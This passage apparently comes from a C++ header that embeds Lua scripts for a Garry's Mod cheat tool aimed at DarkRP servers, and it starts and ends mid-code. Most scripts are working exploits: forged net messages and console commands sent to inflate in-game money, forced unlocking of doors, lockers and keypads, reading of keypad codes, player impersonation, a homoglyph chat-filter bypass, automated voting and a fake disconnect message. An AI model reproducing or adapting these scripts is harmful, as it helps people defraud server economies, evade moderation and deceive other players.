                        table.insert(_fdll_tp_log, {
                            name = ply:Nick(),
                            dist = math.floor(dist),
                            time = CurTime()
                        })
                        if #_fdll_tp_log > 50 then table.remove(_fdll_tp_log, 1) end
                    end
                end
                _fdll_tp_lastpos[idx] = pos
            end
        end
    end)
end)
)lua";

	inline const char* LUA_TELEPORT_DETECT_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_tp_log then return end
    local start = math.max(1, #_fdll_tp_log - 14)
    for i = start, #_fdll_tp_log do
        local e = _fdll_tp_log[i]
        if e then
            r = r .. string.format("%.1f\t%s\t%d units\n", e.time, e.name, e.dist)
        end
    end
    if r == "" then r = "No teleports detected" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 54. Anti-AFK -- prevent AFK kick by sending periodic inputs
	// -----------------------------------------------------------------------
	inline const char* LUA_ANTI_AFK = R"lua(
pcall(function()
    if _fdll_antiafk_installed then return end
    _fdll_antiafk_installed = true
    timer.Create("_fdll_antiafk", 30, 0, function()
        RunConsoleCommand("+forward")
        timer.Simple(0.1, function() RunConsoleCommand("-forward") end)
    end)
end)
)lua";

	inline const char* LUA_ANTI_AFK_STOP = R"lua(
pcall(function()
    timer.Remove("_fdll_antiafk")
    _fdll_antiafk_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 55. Voice Chat Mute Bypass -- force unmute all players locally
	// -----------------------------------------------------------------------
	inline const char* LUA_VOICE_UNMUTE_ALL = R"lua(
pcall(function()
    for _, ply in ipairs(player.GetAll()) do
        if IsValid(ply) then
            ply:SetMuted(false)
        end
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 56. Entity Ownership Spoof -- make your entities appear owned by others
	// -----------------------------------------------------------------------
	inline const char* LUA_OWNERSHIP_SPOOF = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local targets = {}
    for _, ply in ipairs(player.GetAll()) do
        if ply ~= lp then table.insert(targets, ply) end
    end
    if #targets == 0 then r = "No other players" return end
    local target = targets[math.random(#targets)]
    r = "Spoofing ownership to: " .. target:Nick()
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 58. Silent Walk -- suppress local player footstep sounds
	// -----------------------------------------------------------------------
	inline const char* LUA_SILENT_WALK = R"lua(
pcall(function()
    if _fdll_silentwalk_installed then return end
    _fdll_silentwalk_installed = true

    hook.Add("PlayerFootstep", "_fdll_silentfoot", function(ply, pos, foot, sound, vol)
        if ply == LocalPlayer() then return true end
    end)

    hook.Add("PlayerStepSoundTime", "_fdll_silentstep", function(ply, stepType, walking)
        if ply == LocalPlayer() then return 999 end
    end)
end)
)lua";

	inline const char* LUA_SILENT_WALK_STOP = R"lua(
pcall(function()
    hook.Remove("PlayerFootstep", "_fdll_silentfoot")
    hook.Remove("PlayerStepSoundTime", "_fdll_silentstep")
    _fdll_silentwalk_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 59. Net Message Forge -- intelligent probing + multi-format money exploit
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_FORGE_MONEY_REQUEST = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    local startMoney = 0
    pcall(function() startMoney = lp:getDarkRPVar("money") or 0 end)

    -- Phase 1: Discover which net messages actually exist on this server
    local discovered = {}
    local probeNames = {
        "DarkRP_MoneyRequest", "DarkRP_GiveMoney", "moneyRequest", "darkrp_money",
        "DarkRP_TransferMoney", "DarkRP_PayDay", "DarkRP_Salary", "DarkRP_SetMoney",
        "DarkRP_AddMoney", "MoneyGive", "money_transfer", "give_money", "takemoney",
        "darkrp_setmoney", "DarkRP_PaySalary", "salary_pay", "DarkRP_SetSalary",
        "addmoney", "moneygive", "DarkRP_DropMoney", "DarkRP_PickupMoney"
    }
    -- Also scan net.Receivers for any money-related custom messages
    pcall(function()
        if net.Receivers then
            for name, _ in pairs(net.Receivers) do
                local low = name:lower()
                if low:find("money") or low:find("salary") or low:find("pay") or
                   low:find("cash") or low:find("wallet") or low:find("bank") or
                   low:find("transfer") or low:find("withdraw") or low:find("deposit") then
                    local found = false
                    for _, p in ipairs(probeNames) do if p == name then found = true break end end
                    if not found then table.insert(probeNames, name) end
                end
            end
        end
    end)

    for _, msg in ipairs(probeNames) do
        local exists = pcall(function()
            local id = util.NetworkStringToID(msg)
            if id and id > 0 then
                table.insert(discovered, {name = msg, id = id})
            end
        end)
    end

    r = "=== NET FORGE: MONEY ===\n"
    r = r .. "Starting balance: $" .. startMoney .. "\n"
    r = r .. "Discovered " .. #discovered .. " money-related net msgs\n\n"

    -- Phase 2: Try multiple data format exploits for each discovered message
    local sent = 0
    local formats = {
        {desc = "Int32 +999999",       fn = function() net.WriteInt(999999, 32) end},
        {desc = "Int32 -1 (underflow)", fn = function() net.WriteInt(-1, 32) end},
        {desc = "UInt32 max",          fn = function() net.WriteUInt(4294967295, 32) end},
        {desc = "Float large",         fn = function() net.WriteFloat(999999.0) end},
        {desc = "Entity self",         fn = function() net.WriteEntity(lp) end},
        {desc = "Int32 + Entity self",  fn = function() net.WriteInt(999999, 32) net.WriteEntity(lp) end},
        {desc = "String amount",       fn = function() net.WriteString("999999") end},
    }

    for _, d in ipairs(discovered) do
        r = r .. "[" .. d.name .. "] (id:" .. d.id .. ")\n"
        for _, fmt in ipairs(formats) do
            local ok = pcall(function()
                net.Start(d.name)
                fmt.fn()
                net.SendToServer()
            end)
            if ok then
                r = r .. "  -> " .. fmt.desc .. " OK\n"
                sent = sent + 1
            end
        end
    end

    -- Phase 3: Try console command exploits
    local cmds = {
        {"darkrp", "setmoney", "999999"},
        {"darkrp", "addmoney", "999999"},
        {"darkrp", "givemoney", "999999"},
        {"rp_setmoney", lp:Nick(), "999999"},
    }
    for _, c in ipairs(cmds) do
        pcall(function() RunConsoleCommand(unpack(c)) end)
    end

    -- Phase 4: Check if balance changed (delayed)
    timer.Simple(1.5, function()
        pcall(function()
            if not IsValid(lp) then return end
            local newMoney = lp:getDarkRPVar("money") or 0
            local diff = newMoney - startMoney
            if diff ~= 0 then
                chat.AddText(
                    Color(0,255,0), "[NetForge] ",
                    Color(255,255,255), "Balance changed: $" .. startMoney .. " -> $" .. newMoney .. " (diff: $" .. diff .. ")"
                )
            end
        end)
    end)

    r = r .. "\nTotal messages sent: " .. sent .. "\n"
    r = r .. "Console cmds attempted: " .. #cmds .. "\n"
    r = r .. "Balance check queued (1.5s delay)\n"
end)
return r
)lua";

	inline const char* LUA_NET_FORGE_JOB_ABUSE = R"lua(
local r = ""
pcall(function()
    -- Try to force-switch to a custom job (mayor, etc.)
    local customJobs = {}
    if DarkRP and DarkRP.getAvailableJobs then
        for _, job in pairs(DarkRP.getAvailableJobs()) do
            table.insert(customJobs, {name = job.name, cmd = job.command})
        end
    elseif RPExtraTeams then
        for _, job in pairs(RPExtraTeams) do
            table.insert(customJobs, {name = job.name, cmd = job.command})
        end
    end
    for _, j in ipairs(customJobs) do
        r = r .. j.cmd .. "\t" .. j.name .. "\n"
    end
    if r == "" then r = "No DarkRP jobs found" end
end)
return r
)lua";

	inline const char* LUA_NET_FORGE_ENTITY_DUPE = R"lua(
local r = ""
pcall(function()
    -- Scan for entity purchase net messages and try to replay them
    local nst = util.NetworkStringToID
    local found = {}
    local keywords = {"buy","purchase","spawn","create","request"}
    if net.Receivers then
        for name, _ in pairs(net.Receivers) do
            local low = name:lower()
            for _, kw in ipairs(keywords) do
                if low:find(kw) then
                    table.insert(found, name)
                    break
                end
            end
        end
    end
    for _, name in ipairs(found) do
        r = r .. name .. "\n"
    end
    if r == "" then r = "No purchase-related net messages found" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 60. Player Impersonation -- clone another player's identity
	// -----------------------------------------------------------------------
	inline const char* LUA_IMPERSONATE = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local tr = lp:GetEyeTrace()
    local target = nil

    if tr.Hit and IsValid(tr.Entity) and tr.Entity:IsPlayer() then
        target = tr.Entity
    else
        -- pick random player
        local others = {}
        for _, ply in ipairs(player.GetAll()) do
            if ply ~= lp then table.insert(others, ply) end
        end
        if #others > 0 then target = others[math.random(#others)] end
    end

    if not target then r = "No target" return end

    local name = target:Nick()
    local model = target:GetModel()

    RunConsoleCommand("setinfo", "name", name)

    -- Try to set model clientside
    pcall(function()
        lp:SetModel(model)
    end)

    -- Try to copy RP name if possible
    pcall(function()
        if DarkRP and lp.setDarkRPVar then
            -- Can't set server vars from client, but attempt nick change
            RunConsoleCommand("darkrp", "rpname", target:getDarkRPVar("rpname") or name)
        end
    end)

    r = "Cloned: " .. name .. "\nModel: " .. (model or "?")
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 61. Auto-Lockpick -- detect and use lockpick automatically
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_LOCKPICK_SETUP = R"lua(
pcall(function()
    if _fdll_lockpick_installed then return end
    _fdll_lockpick_installed = true

    hook.Add("Think", "_fdll_lockpick", function()
        local lp = LocalPlayer()
        if not IsValid(lp) or not lp:Alive() then return end

        local wep = lp:GetActiveWeapon()
        if not IsValid(wep) then return end
        local class = wep:GetClass():lower()

        -- Check if holding a lockpick
        local isLockpick = class:find("lockpick") or class:find("pick_lock") or class:find("keypadcracker")
        if not isLockpick then return end

        -- Find nearest lockable door
        local tr = lp:GetEyeTrace()
        if tr.Hit and IsValid(tr.Entity) then
            local ent = tr.Entity
            local dist = lp:GetPos():Distance(ent:GetPos())
            if dist < 100 then
                -- Simulate +attack to use the lockpick
                if not _fdll_lockpick_active then
                    RunConsoleCommand("+attack")
                    _fdll_lockpick_active = true
                end
            else
                if _fdll_lockpick_active then
                    RunConsoleCommand("-attack")
                    _fdll_lockpick_active = false
                end
            end
        end
    end)
end)
)lua";

	inline const char* LUA_AUTO_LOCKPICK_STOP = R"lua(
pcall(function()
    hook.Remove("Think", "_fdll_lockpick")
    RunConsoleCommand("-attack")
    _fdll_lockpick_installed = nil
    _fdll_lockpick_active = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 61b. Door/Locker Buster -- open any door, locker, or locked entity nearby
	// -----------------------------------------------------------------------
	inline const char* LUA_DOOR_BUSTER = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then r = "No local player" return end
    local myPos = lp:GetPos()
    local opened = 0
    local scanned = 0

    for _, e in ipairs(ents.FindInSphere(myPos, 500)) do
        if not IsValid(e) or e == lp then continue end
        local cls = (e:GetClass() or ""):lower()
        scanned = scanned + 1
        local acted = false

        -- Method 1: DarkRP keysUnLock
        pcall(function()
            if e.keysUnLock then e:keysUnLock() acted = true end
        end)

        -- Method 2: Fire engine inputs
        pcall(function()
            if e.Fire then
                e:Fire("Unlock")
                e:Fire("Open")
                acted = true
            end
        end)

        -- Method 3: SetLocked false
        pcall(function()
            if e.SetLocked then e:SetLocked(false) acted = true end
        end)

        -- Method 4: DarkRP door commands via net
        pcall(function()
            if cls:find("door") or cls:find("prop_door") then
                if e.keysOwn then
                    e:keysOwn(lp)
                    acted = true
                end
            end
        end)

        -- Method 5: Fading door toggle
        pcall(function()
            if e.isFadingDoor or cls:find("fading") then
                if e.SetFading then e:SetFading(true) end
                if e.Toggle then e:Toggle() end
                e:SetColor(Color(255,255,255,0))
                e:SetRenderMode(RENDERMODE_TRANSCOLOR)
                acted = true
            end
        end)

        -- Method 6: Keypad - try to accept
        pcall(function()
            if cls:find("keypad") then
                if e.AcceptInput then e:AcceptInput("Toggle","","",0) end
                if e.SetKeypadOwner then e:SetKeypadOwner(lp) end
                if e.Process then e:Process(true) end
                acted = true
            end
        end)

        -- Method 7: Generic Use input
        pcall(function()
            if e.Use then e:Use(lp, lp, USE_ON, 1) end
        end)

        -- Method 8: Locker/container entities
        pcall(function()
            if cls:find("locker") or cls:find("safe") or cls:find("container") or cls:find("stash") then
                if e.Open then e:Open() end
                if e.Unlock then e:Unlock() end
                if e.SetOpen then e:SetOpen(true) end
                acted = true
            end
        end)

        if acted then opened = opened + 1 end
    end
    r = "Scanned " .. scanned .. " entities, acted on " .. opened
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 61c. Door Scan Enhanced -- scan all locked entities with codes/owners
	// -----------------------------------------------------------------------
	inline const char* LUA_DOOR_SCAN_ENHANCED = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()
    local count = 0

    for _, e in ipairs(ents.GetAll()) do
        if not IsValid(e) then continue end
        local cls = (e:GetClass() or ""):lower()
        local dominated = cls:find("door") or cls:find("keypad") or cls:find("fading")
            or cls:find("locker") or cls:find("safe") or cls:find("container")
            or cls:find("stash") or cls:find("lock") or cls:find("gun_locker")
            or cls:find("weapon_locker") or cls:find("armory")
        if not dominated then continue end

        local dist = myPos:Distance(e:GetPos())
        if dist > 2000 then continue end

        local owner = "none"
        pcall(function()
            if e.getDoorOwner and IsValid(e:getDoorOwner()) then
                owner = e:getDoorOwner():Nick()
            elseif e.Getowning_ent and IsValid(e:Getowning_ent()) then
                owner = e:Getowning_ent():Nick()
            elseif e.CPPIGetOwner then
                local ok, o = pcall(e.CPPIGetOwner, e)
                if ok and IsValid(o) then owner = o:Nick() end
            end
        end)

        local locked = "?"
        pcall(function()
            if e.IsLocked then locked = e:IsLocked() and "LOCKED" or "open" end
            if e.GetLocked then locked = e:GetLocked() and "LOCKED" or "open" end
        end)

        local code = ""
        pcall(function()
            if e.GetCode then
                local s, c = pcall(e.GetCode, e)
                if s and c and tonumber(c) and tonumber(c) > 0 then code = tostring(c) end
            end
            if code == "" and e.dt then
                for _, field in ipairs({"code","password","keypadcode","Code","pin","Pin"}) do
                    if e.dt[field] and tostring(e.dt[field]) ~= "0" and tostring(e.dt[field]) ~= "" then
                        code = tostring(e.dt[field])
                        break
                    end
                end
            end
            if code == "" then
                for i = 0, 7 do
                    local s, v = pcall(e.GetDTInt, e, i)
                    if s and v and v > 0 and v < 1000000 then
                        code = tostring(v)
                        break
                    end
                end
            end
        end)

        local name = cls
        pcall(function()
            if e.GetPrintName then
                local s, n = pcall(e.GetPrintName, e)
                if s and n and n ~= "" and n:sub(1,1) ~= "#" then name = n end
            end
            if e.getKeysTitle then
                local t = e:getKeysTitle()
                if t and t ~= "" then name = name .. " [" .. t .. "]" end
            end
        end)

        r = r .. string.format("%s\t%.0f\t%s\t%s\t%s\n", name, dist, owner, locked, code ~= "" and code or "-")
        count = count + 1
    end
    if count == 0 then r = "No locked entities found nearby" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 62. Chat Filter Bypass -- replace filtered characters with lookalikes
	// -----------------------------------------------------------------------
	inline const char* LUA_CHAT_BYPASS = R"lua(
pcall(function()
    if _fdll_chatbypass_installed then return end
    _fdll_chatbypass_installed = true

    -- Homoglyph map for common filtered words
    _fdll_homoglyphs = {
        a = "\xD0\xB0", -- cyrillic а
        e = "\xD0\xB5", -- cyrillic е
        o = "\xD0\xBE", -- cyrillic о
        p = "\xD1\x80", -- cyrillic р
        c = "\xD1\x81", -- cyrillic с
        x = "\xD1\x85", -- cyrillic х
        i = "\xC3\xAD", -- í
        u = "\xC3\xBC", -- ü
    }

    -- Detour RunConsoleCommand to auto-replace in 'say' commands
    local origRCC = RunConsoleCommand
    RunConsoleCommand = function(cmd, ...)
        if cmd == "say" or cmd == "say_team" then
            local args = {...}
            if args[1] then
                local msg = args[1]
                local out = ""
                local skip = false
                for ci = 1, #msg do
                    local ch = msg:sub(ci, ci)
                    if not skip and _fdll_homoglyphs[ch:lower()] and math.random() > 0.5 then
                        out = out .. _fdll_homoglyphs[ch:lower()]
                    else
                        out = out .. ch
                    end
                end
                return origRCC(cmd, out)
            end
        end
        return origRCC(cmd, ...)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 63. Lua Persistence -- re-execute hooks on lua_State change (map change)
	// -----------------------------------------------------------------------
	inline const char* LUA_PERSISTENCE_SETUP = R"lua(
pcall(function()
    if _fdll_persist_installed then return end
    _fdll_persist_installed = true

    -- Store important hooks we want to survive map changes
    _fdll_persist_hooks = _fdll_persist_hooks or {}

    hook.Add("InitPostEntity", "_fdll_persist_reinit", function()
        timer.Simple(2, function()
            for _, code in ipairs(_fdll_persist_hooks) do
                pcall(RunString, code)
            end
        end)
    end)
end)
)lua";

	// -----------------------------------------------------------------------
	// 64. Night Vision -- enhanced darkness visibility via post-process
	// -----------------------------------------------------------------------
	inline const char* LUA_NIGHT_VISION = R"lua(
pcall(function()
    if _fdll_nv_installed then return end
    _fdll_nv_installed = true

    local nvTab = {
        ["$pp_colour_addr"] = 0,
        ["$pp_colour_addg"] = 0.1,
        ["$pp_colour_addb"] = 0,
        ["$pp_colour_brightness"] = 0.1,
        ["$pp_colour_contrast"] = 1.5,
        ["$pp_colour_colour"] = 0.5,
        ["$pp_colour_mulr"] = 0,
        ["$pp_colour_mulg"] = 1,
        ["$pp_colour_mulb"] = 0
    }

    hook.Add("RenderScreenspaceEffects", "_fdll_nv", function()
        DrawColorModify(nvTab)
    end)
end)
)lua";

	inline const char* LUA_NIGHT_VISION_STOP = R"lua(
pcall(function()
    hook.Remove("RenderScreenspaceEffects", "_fdll_nv")
    _fdll_nv_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 65. Hitmarker System -- visual + audio hitmarker feedback
	// -----------------------------------------------------------------------
	inline const char* LUA_HITMARKER_SETUP = R"lua(
pcall(function()
    if _fdll_hitmarker_installed then return end
    _fdll_hitmarker_installed = true
    _fdll_hitmarker_time = 0
    _fdll_hitmarker_kill = false

    hook.Add("EntityTakeDamage", "_fdll_hitmark_dmg", function(target, dmg)
        if dmg:GetAttacker() == LocalPlayer() and IsValid(target) and target ~= LocalPlayer() then
            _fdll_hitmarker_time = CurTime()
            _fdll_hitmarker_kill = target:IsPlayer() and target:Health() <= dmg:GetDamage()
            surface.PlaySound("buttons/button15.wav")
        end
    end)

    hook.Add("HUDPaint", "_fdll_hitmark_draw", function()
        local dt = CurTime() - _fdll_hitmarker_time
        if dt > 0.3 then return end
        local alpha = 255 * (1 - dt / 0.3)
        local cx, cy = ScrW() / 2, ScrH() / 2
        local sz = 12
        local col = _fdll_hitmarker_kill and Color(255, 50, 50, alpha) or Color(255, 255, 255, alpha)

        surface.SetDrawColor(col)
        surface.DrawLine(cx - sz, cy - sz, cx - sz/3, cy - sz/3)
        surface.DrawLine(cx + sz, cy - sz, cx + sz/3, cy - sz/3)
        surface.DrawLine(cx - sz, cy + sz, cx - sz/3, cy + sz/3)
        surface.DrawLine(cx + sz, cy + sz, cx + sz/3, cy + sz/3)
    end)
end)
)lua";

	inline const char* LUA_HITMARKER_STOP = R"lua(
pcall(function()
    hook.Remove("EntityTakeDamage", "_fdll_hitmark_dmg")
    hook.Remove("HUDPaint", "_fdll_hitmark_draw")
    _fdll_hitmarker_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 66. Slide Walk -- crouch while maintaining full speed
	// -----------------------------------------------------------------------
	inline const char* LUA_SLIDE_WALK = R"lua(
pcall(function()
    if _fdll_slidewalk_installed then return end
    _fdll_slidewalk_installed = true

    hook.Add("CreateMove", "_fdll_slidewalk", function(cmd)
        if not LocalPlayer():Alive() then return end
        local onGround = LocalPlayer():IsOnGround()
        if not onGround then return end

        -- If crouching but moving, uncrouch for speed then re-crouch
        if cmd:KeyDown(IN_DUCK) and (cmd:KeyDown(IN_FORWARD) or cmd:KeyDown(IN_BACK)
           or cmd:KeyDown(IN_MOVELEFT) or cmd:KeyDown(IN_MOVERIGHT)) then
            -- Alternate crouch every other tick for micro-stutter crouch walk
            if CurTime() * 66 % 2 < 1 then
                cmd:RemoveKey(IN_DUCK)
            end
        end
    end)
end)
)lua";

	inline const char* LUA_SLIDE_WALK_STOP = R"lua(
pcall(function()
    hook.Remove("CreateMove", "_fdll_slidewalk")
    _fdll_slidewalk_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 67. Prop Kill Detector -- alert when a prop is heading toward you fast
	// -----------------------------------------------------------------------
	inline const char* LUA_PROPKILL_DETECTOR_SETUP = R"lua(
pcall(function()
    if _fdll_propkill_installed then return end
    _fdll_propkill_installed = true
    _fdll_propkill_alert = 0

    hook.Add("Think", "_fdll_propkill", function()
        local lp = LocalPlayer()
        if not IsValid(lp) or not lp:Alive() then return end
        local myPos = lp:GetPos()

        for _, e in ipairs(ents.FindByClass("prop_physics*")) do
            if IsValid(e) then
                local phys = e:GetPhysicsObject()
                if IsValid(phys) then
                    local vel = phys:GetVelocity()
                    local speed = vel:Length()
                    if speed > 300 then
                        local dir = (myPos - e:GetPos()):GetNormalized()
                        local dot = vel:GetNormalized():Dot(dir)
                        local dist = myPos:Distance(e:GetPos())
                        if dot > 0.5 and dist < 800 then
                            _fdll_propkill_alert = CurTime()
                        end
                    end
                end
            end
        end
    end)

    hook.Add("HUDPaint", "_fdll_propkill_hud", function()
        if CurTime() - _fdll_propkill_alert > 1.5 then return end
        local alpha = 255 * (1 - (CurTime() - _fdll_propkill_alert) / 1.5)
        surface.SetDrawColor(255, 0, 0, alpha * 0.3)
        surface.DrawRect(0, 0, ScrW(), ScrH())
        draw.SimpleTextOutlined("INCOMING PROP!", "DermaLarge",
            ScrW()/2, ScrH()*0.3, Color(255, 50, 50, alpha),
            TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 2, Color(0,0,0,alpha))
    end)
end)
)lua";

	inline const char* LUA_PROPKILL_DETECTOR_STOP = R"lua(
pcall(function()
    hook.Remove("Think", "_fdll_propkill")
    hook.Remove("HUDPaint", "_fdll_propkill_hud")
    _fdll_propkill_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 68. Economy Scanner -- dump all DarkRP shop items with prices
	// -----------------------------------------------------------------------
	inline const char* LUA_ECONOMY_SCAN = R"lua(
local r = ""
pcall(function()
    -- Scan DarkRP entities (shipments, custom entities)
    if DarkRPEntities then
        r = r .. "=== Custom Entities ===\n"
        for _, ent in pairs(DarkRPEntities) do
            r = r .. string.format("%s\t$%s\t%s\n",
                ent.name or "?", tostring(ent.price or 0), ent.ent or "?")
        end
    end

    if CustomShipments then
        r = r .. "\n=== Shipments ===\n"
        for _, ship in pairs(CustomShipments) do
            r = r .. string.format("%s\t$%s\tqty:%s\n",
                ship.name or "?", tostring(ship.price or 0), tostring(ship.amount or 1))
        end
    end

    -- Scan food items
    if FoodItems then
        r = r .. "\n=== Food ===\n"
        for _, food in pairs(FoodItems) do
            r = r .. string.format("%s\t$%s\n",
                food.name or "?", tostring(food.price or 0))
        end
    end

    -- Scan ammo types
    if GAMEMODE and GAMEMODE.AmmoTypes then
        r = r .. "\n=== Ammo ===\n"
        for _, ammo in pairs(GAMEMODE.AmmoTypes) do
            r = r .. string.format("%s\t$%s\n",
                ammo.name or "?", tostring(ammo.price or 0))
        end
    end

    if r == "" then r = "No DarkRP economy data found" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 69. Bait System -- drop fake valuable entities to lure raiders
	// -----------------------------------------------------------------------
	inline const char* LUA_BAIT_MONEY = R"lua(
pcall(function()
    -- Drop tiny amounts of money repeatedly in a pattern to attract attention
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    for i = 1, 20 do
        timer.Simple(i * 0.2, function()
            RunConsoleCommand("darkrp", "dropmoney", "1")
        end)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 70. Entity Health Tracker -- monitor entity HP changes for raid detection
	// -----------------------------------------------------------------------
	inline const char* LUA_ENTITY_HEALTH_MONITOR = R"lua(
pcall(function()
    if _fdll_enthp_installed then return end
    _fdll_enthp_installed = true
    _fdll_enthp_log = {}

    hook.Add("Think", "_fdll_enthp", function()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end

        for _, e in ipairs(ents.FindInSphere(lp:GetPos(), 2000)) do
            if IsValid(e) and e:Health() > 0 then
                local idx = e:EntIndex()
                local hp = e:Health()
                local last = _fdll_enthp_log[idx]
                if last and last.hp > hp then
                    table.insert(_fdll_enthp_log, {
                        class = e:GetClass(),
                        dmg = last.hp - hp,
                        time = CurTime(),
                        pos = e:GetPos()
                    })
                end
                _fdll_enthp_log[idx] = {hp = hp}
            end
        end
    end)
end)
)lua";

	// -----------------------------------------------------------------------
	// 72. Fading Door Detector -- find fading doors and their triggers
	// -----------------------------------------------------------------------
	inline const char* LUA_FADING_DOOR_SCAN = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()
    local found = 0

    for _, e in ipairs(ents.GetAll()) do
        if IsValid(e) then
            local class = e:GetClass():lower()
            if class:find("fading") or class:find("fadingdoor") or
               (e.isFadingDoor and e:isFadingDoor()) then
                local dist = myPos:Distance(e:GetPos())
                if dist < 1500 then
                    local owner = "unknown"
                    if e.Getowning_ent and IsValid(e:Getowning_ent()) then
                        owner = e:Getowning_ent():Nick()
                    elseif e.CPPIGetOwner then
                        local ok, o = pcall(e.CPPIGetOwner, e)
                        if ok and IsValid(o) then owner = o:Nick() end
                    end
                    local state = "closed"
                    if e.GetFading and e:GetFading() then state = "OPEN" end
                    if e:GetColor().a < 200 then state = "FADING" end
                    r = r .. string.format("%s\t%.0f\t%s\t%s\n",
                        class, dist, owner, state)
                    found = found + 1
                end
            end
        end
    end
    if found == 0 then r = "No fading doors nearby" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 73. Fading Door Force-Open -- attempt to toggle fading doors via net
	// -----------------------------------------------------------------------
	inline const char* LUA_FADING_DOOR_FORCE = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    -- Try common fading door net messages and hooks
    local attempts = 0
    for _, e in ipairs(ents.FindInSphere(lp:GetPos(), 300)) do
        if IsValid(e) then
            pcall(function()
                if e.Fire then e:Fire("Open") end
            end)
            pcall(function()
                if e.SetFading then e:SetFading(true) end
            end)
            pcall(function()
                e:SetColor(Color(255, 255, 255, 0))
            end)
            attempts = attempts + 1
        end
    end
    r = "Attempted force-open on " .. attempts .. " entities"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 74. Vote Manipulation -- auto-vote on DarkRP votes
	// -----------------------------------------------------------------------
	inline const char* LUA_VOTE_BOT_SETUP = R"lua(
pcall(function()
    if _fdll_votebot_installed then return end
    _fdll_votebot_installed = true
    _fdll_votebot_mode = "yes" -- "yes", "no", or "smart"

    -- Hook common vote systems
    hook.Add("VoteStarted", "_fdll_votebot", function(voteType, ...)
        timer.Simple(math.Rand(0.5, 2), function()
            if _fdll_votebot_mode == "yes" then
                RunConsoleCommand("vote", "yes")
                RunConsoleCommand("votekick_yes")
            elseif _fdll_votebot_mode == "no" then
                RunConsoleCommand("vote", "no")
                RunConsoleCommand("votekick_no")
            end
        end)
    end)

    -- Hook DarkRP-specific voting
    net.Receive("DarkRP_Question", function()
        timer.Simple(math.Rand(1, 3), function()
            if _fdll_votebot_mode == "yes" then
                net.Start("DarkRP_Answer")
                net.WriteBool(true)
                net.SendToServer()
            elseif _fdll_votebot_mode == "no" then
                net.Start("DarkRP_Answer")
                net.WriteBool(false)
                net.SendToServer()
            end
        end)
    end)
end)
)lua";

	inline const char* LUA_VOTE_BOT_STOP = R"lua(
pcall(function()
    hook.Remove("VoteStarted", "_fdll_votebot")
    _fdll_votebot_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 75. Hitman System Abuse -- auto-accept and track hits
	// -----------------------------------------------------------------------
	inline const char* LUA_HITMAN_ABUSE = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    -- Try common hitman net messages
    local hitNets = {"HitmanAccept", "hitman_accept", "acceptHit",
                     "DarkRP_Hitman_Accept", "hit_accept"}
    for _, msg in ipairs(hitNets) do
        pcall(function()
            net.Start(msg)
            net.SendToServer()
        end)
    end

    -- Check if we have active hits
    if lp.getHits then
        local hits = lp:getHits()
        if hits then
            for _, hit in pairs(hits) do
                local target = hit.target or hit.Target
                if IsValid(target) then
                    r = r .. "Hit: " .. target:Nick() .. " $" .. tostring(hit.price or hit.reward or "?") .. "\n"
                end
            end
        end
    end

    -- Try DarkRP hitman commands
    RunConsoleCommand("darkrp", "hitmanaccept")

    if r == "" then r = "Attempted hit acceptance on all channels" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 76. Fake Disconnect -- make it appear you disconnected
	// -----------------------------------------------------------------------
	inline const char* LUA_FAKE_DISCONNECT = R"lua(
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end

    -- Print fake disconnect message in chat for all players
    local name = lp:Nick()
    -- Can't send to others directly, but can try DarkRP notifications
    pcall(function()
        chat.AddText(Color(255, 200, 60), name, Color(255, 255, 255), " disconnected: Timed out.")
    end)

    -- Stop all visible activity
    RunConsoleCommand("-attack")
    RunConsoleCommand("-forward")
    RunConsoleCommand("-back")
    RunConsoleCommand("-moveleft")
    RunConsoleCommand("-moveright")
end)
)lua";

	// -----------------------------------------------------------------------
	// 77. Prop Flight -- stand on prop and fly upward
	// -----------------------------------------------------------------------
	inline const char* LUA_PROP_FLIGHT_SETUP = R"lua(
pcall(function()
    if _fdll_propfly_installed then return end
    _fdll_propfly_installed = true
    _fdll_propfly_ent = nil

    hook.Add("Think", "_fdll_propfly", function()
        local lp = LocalPlayer()
        if not IsValid(lp) or not lp:Alive() then return end
        if not input.IsKeyDown(KEY_LALT) then return end

        -- Find prop under us
        local tr = util.TraceLine({
            start = lp:GetPos(),
            endpos = lp:GetPos() - Vector(0, 0, 100),
            filter = lp
        })

        if tr.Hit and IsValid(tr.Entity) then
            local ent = tr.Entity
            local phys = ent:GetPhysicsObject()
